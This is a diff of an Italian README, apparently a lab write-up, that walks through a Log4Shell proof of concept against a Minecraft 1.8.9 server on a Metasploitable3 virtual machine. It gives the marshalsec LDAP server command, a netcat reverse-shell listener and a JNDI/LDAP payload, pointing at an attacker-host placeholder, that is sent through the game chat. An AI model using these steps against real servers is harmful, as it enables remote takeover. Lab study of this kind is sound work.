@@ -32,12 +32,45 @@ A questo punto il sistema attaccato sarà nel completo controllo dell'attaccante
 
 * **JDK 8.1.0_101**: E' necessario l'utilizzo della stessa versione Java con cui il server Minecraft è compilato, altrimenti l'esecuzione della classe malevola sul server non funzionerebbe.
 * **Python**: Per l'avvio di un server http che consenta l'invio della classe Java.
-* **Netcat**: Per consentire la connesione TCP della vittima all'attccante in modo da fornire una reverse shell.
+* **Netcat**: Per consentire la connesione TCP della vittima all'attaccante in modo da fornire una reverse shell.
 
-# PoC
+# PoC e problematiche rilevate
+**Passaggi partici dell'attacco, a partire dalla preparazione dell'ambiente dell'attaccante fino all'iniezione dell'exploit. Successivamente seguiranno alcuni problemi e risoluzioni di tali che si sono riscontrati durante i tentativi di attacco.**
+
 **1)** Scrittura classe Java e compliarla tramite "javac" con la stessa versione del server vulnerabile: `javac <percorso>/NomeClasseJavaMalevola.jar` che darà in output un file .class essenziale per il server HTTP.
 
 **2)** Avvio del server LDAP tramite: 
 ```console
 java -cp target/marshalsec-[VERSIONE]-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <inidirizzo_attacante_serverHTTP>#<NomeClasseJavaMalevola> [<porta>]
 ``` 
+**3)** Avvio del server http tramite:
+```console
+python3 http
+``` 
+**4)** Avvio del server netcat tramite:
+```console
+netcat -lnvp <porta>
+``` 
+**A questo punto l'ambiente dell'attaccante è pronto, è ora possibile l'inizio della fase di iniezione.**
+
+**Nota:** Per l'iniezione non è necessario che sia sempre lo stesso attaccante/macchina ad eseguire questi passaggi, perciò per questioni di ottimizzazione e per non appesantire eccessivamente le macchine virtuali, l'iniezione verrà effettuata direttamente dalla macchina host, si è proceduto così all'apertura della porta 
+**255565**[(1)](#1-quasi-tutti-i-server-di-gioco-sono-impostati-con-la-porta-well-known-25565-se-non-diversamente-configurati-anche-nel-nostro-caso-si-è-proceduto-a-lasciare-la-porta-predefinita) 
+di VirtualBox per consentire all'host di raggiungere il server vittima.
+
+1) Download ed installazione di Java per poter avviare il gioco, a contrario del server vittima e dell'ambiente dell'attaccante, non è necessaria la versione specifica vulnerabile.
+
+2) Download di un launcher compatibile con il server, nel caso di server che richiedano l'autenticazione Microsoft si ha bisogno del launcher originale; in caso contrario anche l'utilizzo di launcher di terze parti senza licenza è sufficiente.
+
+3) **Scelta della corretta versione di gioco**, si è scoperto che per questa versione del server (1.8.9), l'iniezione è in realtà possibile anche con la versione precedente ossia la 1.8.0, quindi è indifferente la scelta tra le due poiché l'exploit funzionerà in entrambi i casi.
+
+4) Connessione al server di gioco e invio tramite chat di gioco del payload usando la semantica utile al nostro caso:
+ ```shell
+ {jndi:ldap://<IP ATTACCANTE>:<PORTA LDAP ATTACCANTE>/#<NomeClasseJava>}
+ ```
+### Altre criticità riscontrate e problemi noti
+Come anticipato il server in questione è stato direttamente hostato sulla macchina virtaule *Metasploitable3*, per cui il funzionamento dell'attacco e le relative criticità si riferiscono a questo ambiente.
+
+
+
+---
+##### [(1)](#25565): Quasi tutti i server di gioco sono impostati con la porta "well-known" '25565', se non diversamente configurati, anche nel nostro caso si è proceduto a lasciare la porta predefinita.
